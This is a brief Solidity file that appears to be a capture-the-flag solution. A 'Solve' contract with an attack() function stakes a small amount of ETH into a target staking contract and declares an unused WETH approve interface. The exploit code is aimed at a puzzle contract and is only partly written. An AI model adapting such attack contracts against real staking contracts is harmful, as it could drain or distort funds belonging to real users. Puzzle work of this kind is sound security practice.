// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IStake {
    function UserStake(address) external returns (uint256);
    function WETH() external returns (address);
    function StakeETH() external payable;
    function StakeWETH(uint256) external returns (bool);
    function Unstake(uint256) external returns (bool);
}

interface IWETH {
    function approve(address, uint256) external returns (bool);
}

contract Solve {
    address target;
    address WETH;

    constructor(address _target) payable {
        target = _target;
        WETH = IStake(_target).WETH();
    }

    function attack() public {
        IStake(target).StakeETH{value: 0.0012 ether}();
    }
}